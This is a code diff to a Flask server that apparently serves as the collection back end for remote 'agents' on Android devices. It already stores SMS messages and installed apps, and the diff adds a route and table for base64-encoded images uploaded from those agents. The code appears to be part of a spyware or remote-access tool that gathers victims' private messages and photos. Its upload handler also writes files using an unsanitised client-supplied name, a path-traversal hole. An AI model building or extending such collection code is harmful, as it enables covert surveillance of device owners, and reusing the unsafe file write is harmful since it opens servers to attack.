@@ -27,6 +27,12 @@ def viewSms():
     data_rows, columns = get_data_sql(sql)
     return render_template("sms.html", title="sms", columns=columns, data=data_rows)
 
+@app.route("/images")
+def viewImages():
+    sql = "SELECT * FROM images"
+    data_rows, columns = get_data_sql(sql)
+    return render_template("images.html", title="images", columns=columns, data=data_rows)
+
 @app.route("/app")
 def viewApp():
     sql = "SELECT id, package, sourceDir, launchActivity FROM app"
@@ -131,8 +137,14 @@ def handle_images(content, id):
         image_name = json_data.get("image_name","")
         encoded_bytes = json_data.get("bytes", "")   
         decoded_bytes = base64.b64decode(encoded_bytes)
-        with open("img/"+image_name, 'wb') as f: 
+        path = "img/"+image_name
+        with open("static/" + path, 'wb') as f: 
             f.write(decoded_bytes)
+
+        # Save data to database
+        sql = "INSERT INTO images VALUES (?, ?)"
+        args = (id, path)
+        writeToDatabase(sql, args)
         
     
     return ("Success", 200)
@@ -210,6 +222,7 @@ def init_database():
         sqls = [
             "CREATE TABLE IF NOT EXISTS agents(id TEXT)",
             "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)",
+            "CREATE TABLE IF NOT EXISTS images (id TEXT, path TEXT)",
             "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)"
         ]
 
